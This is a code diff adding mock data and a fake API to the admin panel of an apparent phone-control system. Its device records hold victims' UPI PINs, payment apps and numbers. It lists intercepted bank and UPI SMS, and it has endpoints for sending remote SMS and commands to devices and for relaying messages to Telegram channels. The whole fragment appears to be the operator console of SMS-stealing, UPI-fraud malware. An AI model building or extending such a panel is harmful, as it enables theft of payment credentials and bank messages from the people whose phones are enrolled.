+{id:"d2",short_id:"TPC-0002",device_name:"Realme C55",ws_connected:true,live_number:"+91 98765 44556",entered_number:"+91 98765 44556",upi_pin:"9107",payment_app:"Paytm",created_at:Date.now()-518400000,auto_sender:{enabled:false,channel_id:"",channel_title:""},telemetry:{model:"Realme C55",manufacturer:"Realme",android_version:"14",battery_level:23,ram_gb:4,storage_gb:64,network_type:"4G",sims:[{slot:0,carrier:"Airtel"}]}},
+{id:"d3",short_id:"TPC-0003",device_name:"Poco M6",ws_connected:false,live_number:null,entered_number:"+91 90123 77889",upi_pin:"3355",payment_app:"GPay",created_at:Date.now()-345600000,auto_sender:{enabled:false,channel_id:"",channel_title:""},telemetry:{model:"Poco M6",manufacturer:"Poco",android_version:"13",battery_level:12,ram_gb:4,storage_gb:128,network_type:"WiFi",sims:[{slot:0,carrier:"Vi"}]}},
+{id:"d4",short_id:"TPC-0004",device_name:"Samsung A15",ws_connected:true,live_number:"+91 99887 33445",entered_number:"+91 99887 33445",upi_pin:null,payment_app:"PhonePe",created_at:Date.now()-172800000,auto_sender:{enabled:false,channel_id:"",channel_title:""},telemetry:{model:"Galaxy A15",manufacturer:"Samsung",android_version:"14",battery_level:67,ram_gb:6,storage_gb:128,network_type:"5G",sims:[{slot:0,carrier:"Jio"}]}}
+];
+
+const DEMO_MESSAGES = [
+{id:"m0",device_id:"d1",device_name:"Redmi Note 12",device_short:"TPC-0001",direction:"in",address:"VK-SBIINB",body:"Rs.450.00 credited to A/c XX1234 via UPI. Ref 402312459871",amount:"450",kind:"upi",status:"received",created_at:Date.now()-600000},
+{id:"m1",device_id:"d2",device_name:"Realme C55",device_short:"TPC-0002",direction:"in",address:"AX-PAYTM",body:"Rs.1,200 debited from A/c XX9912. UPI ref 402398112233",amount:"1200",kind:"upi",status:"received",created_at:Date.now()-1900000},
+{id:"m2",device_id:"d4",device_name:"Samsung A15",device_short:"TPC-0004",direction:"out",address:"+91 98765 11223",body:"Payment received, thanks!",amount:null,kind:null,status:"sent",created_at:Date.now()-2900000}
+];
+
+function mockApi(path, options) {
+const p = path.split("?")[0];
+const o = options || {};
+let body = {};
+try { body = o.body ? JSON.parse(o.body) : {}; } catch (e) { body = {}; }
+if (p === "/admin/auth/status") return { authenticated: Boolean(readSession()) };
+if (p === "/admin/login") return { status:"ok", username: body.username || "operator", token:"demo." + btoa(body.username || "op"), expires_in:2592000 };
+if (p === "/admin/logout") return { status:"ok" };
+if (p === "/health") return { status:"ok" };
+if (p === "/health/database") return { status:"ok" };
+if (p === "/admin/devices") return { devices: DEMO_DEVICES };
+if (p === "/admin/messages") return { messages: DEMO_MESSAGES };
+if (p === "/admin/rules") {
+if (o.method === "POST") { state.rules.push({ id:"r" + Date.now(), name:body.name, match:body.match, reply:body.reply, upi_only:Boolean(body.upi_only), enabled:true }); return { status:"ok" }; }
+return { rules: state.rules };
+}
+if (/^\/admin\/rules\/[^/]+\/toggle$/.test(p)) {
+const id = p.split("/")[3];
+const r = state.rules.find((x) => x.id === id);
+if (r) r.enabled = !r.enabled;
+return { status:"ok", enabled: r ? r.enabled : false };
+}
+if (p === "/admin/auto-sender") return { relay_ready:true, telethon:true, account:{ username:"tpc_ops" }, forward_user:"@tpc_ops", channels:["-1002345678901"], devices_enabled:1 };
+if (p === "/admin/auto-sender/verify") return { status:"ok", channel_id:body.channel_id, title:"TPC Relay", admin:true };
+if (p === "/admin/auto-sender/test") return { status:"ok" };
+if (/^\/admin\/devices\/[^/]+\/auto-sender$/.test(p)) {
+const id = p.split("/")[3];
+const d = DEMO_DEVICES.find((x) => x.id === id);
+if (!d) return { status:"ok", auto_sender:{ enabled:false, channel_id:"", channel_title:"" } };
+d.auto_sender = {
+enabled: body.enabled === undefined ? d.auto_sender.enabled : Boolean(body.enabled),
+channel_id: body.channel_id || d.auto_sender.channel_id || "",
+channel_title: body.channel_title || d.auto_sender.channel_title || ""
+};
+return { status:"ok", auto_sender:d.auto_sender };
+}
+if (/^\/admin\/devices\/[^/]+\/messages$/.test(p)) {
+const id = p.split("/")[3];
+return { messages: DEMO_MESSAGES.filter((x) => x.device_id === id) };
+}
+if (/^\/admin\/devices\/[^/]+\/(sms|command|ping|refresh|wake)$/.test(p)) return { status:"ok", queued:1, delivered:true };
+if (p === "/admin/send") return { status:"ok", queued:DEMO_DEVICES.length, delivered:DEMO_DEVICES.filter((d) => d.ws_connected).length, note:"" };
+if (p === "/admin/relay/status") return { telethon:true, state:{ authorized:true, me:{ username:"tpc_ops" }, forward_user:"@tpc_ops" }, bans: state.bans || [], channels:["-1002345678901"] };
+if (p === "/admin/relay/logs") return { logs: state.tgLogs };
+if (p === "/admin/relay/login/start") return { status:"code_sent" };
+if (p === "/admin/relay/login/verify") return { status:"ok" };
+if (p === "/admin/relay/logout") return { status:"ok" };
+if (p === "/admin/relay/forward") return { status:"ok", forward_user:body.target };
+if (p === "/admin/relay/bans") {
+state.bans = state.bans || [];
+if (o.method === "POST") { state.bans.push(body.address); return { status:"ok", bans:state.bans }; }
+return { bans: state.bans };
+}
+if (/^\/admin\/relay\/bans\/.+\/delete$/.test(p)) return { status:"ok", bans: state.bans || [] };
+if (p === "/admin/relay/parse") return { matched:true, to:"+919876543210", body:"Rs.450 credited via UPI", device_hint:null, targets:["TPC-0001"] };
+return {};
+}
 
 checkAuth();
 </script>
